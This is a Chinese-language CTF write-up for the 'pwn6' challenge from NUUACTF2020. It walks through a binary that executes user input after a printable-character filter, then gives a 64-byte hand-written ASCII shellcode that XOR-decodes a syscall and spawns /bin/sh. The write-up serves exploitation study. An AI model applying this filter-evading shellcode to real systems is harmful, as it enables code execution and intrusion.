## pwn6 

### 题目描述：

- > nc 49.235.243.206 10506
- 题目附件：[pwn6](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/NUUACTF2020/pwn/pwn6/pwn6)
- 考察点：手写 ascii shellcode
- 难度：中等

### 程序分析
`call rdx` ida识别不出来，所以直接用cutter看啦

```c
undefined8 main(void){
    int64_t iVar1;
    undefined8 uVar2;
    int64_t in_FS_OFFSET;
    undefined8 var_5ch;
    void *buf;
    int64_t canary;
    
    iVar1 = *(int64_t *)(in_FS_OFFSET + 0x28);
    setvbuf(_reloc.stdin, 0, 2, 0);
    setvbuf(_reloc.stdout, 0, 2, 0);
    setvbuf(_reloc.stderr, 0, 2, 0);
    var_5ch._0_4_ = read(0, &buf, 0x40);
    while (var_5ch._0_4_ = (int32_t)var_5ch + -1, -1 < (int32_t)var_5ch) {
        if (*(char *)((int64_t)&buf + (int64_t)(int32_t)var_5ch) < ' ') {
            puts("I GOT YOU");
            exit(0);
        }
    }
    (*(code *)&buf)();
    uVar2 = 0;
    if (iVar1 != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar2 = __stack_chk_fail();
    }
    return uVar2;
}
```

`shellcode`的长度被限制为最多`0x40`字节，所以就要和自动ascii shellcode生成工具`alpha3`说拜拜啦

可输入的字符范围是`0x1f`-`0x7f`

> 代码中是通过`char < 0x1f` 进行判断的，超过`0x7f`就是负数，所以也不能用

### 解题思路
那就只能手动写ascii shellcode了呗~ 之前在DwagCTF遇到过一题，[DawgCTF2020-trASCII](http://taqini.space/2020/04/13/DawgCTF-2020-Pwn-trASCII-Writeup/)，也是手写，但是长度限制没这题严格。

ascii shellcode有两个难点，一是构造`/bin/sh`字符串，二是构造`syscall`指令(`0x050f`)

二者都可以通过异或操作实现，难点在于如何布局。这道题的存储shellcode的`buf`在栈中，所以可以直接把`/bin/sh`写到栈中，然后通过一串的`pop`，把`/bin/sh`传给`rdi`。`syscall`则可以通过先异或编码，然后在shellcode执行时解码还原出`syscall`。

最后是写了一个38字节的shellcode，还算精简叭。

```python
payload = asm('''
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    pop rcx
    push rsp
    pop rdi

    push 0x58585d57
    pop rax
    xor [rdx+38],rax

    push 0x58
    pop rax
    xor [rdx+63],rax
    xor al, 0x58
    push rax
    push rax
    pop rdx
    pop rsi
    push 0x3b
    pop rax

''').ljust(64-8,'X')

payload += '/bin/shX'
```

对了，这题还有一个坑点，就是输入的64个字节必须都在`0x1f`-`0x7f`这个范围内，即使是字符串末尾的`\x00`，也是不可以出现的，所以payload的长度要正好等于64字节。这样一来写在栈里的`/bin/sh`的末尾就没有`\x00`了，我解决的方法是写`/bin/shX`，然后末尾和`X`异或一下，还原出`/bin/sh\0`.

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/NUUACTF2020/pwn/pwn6) 

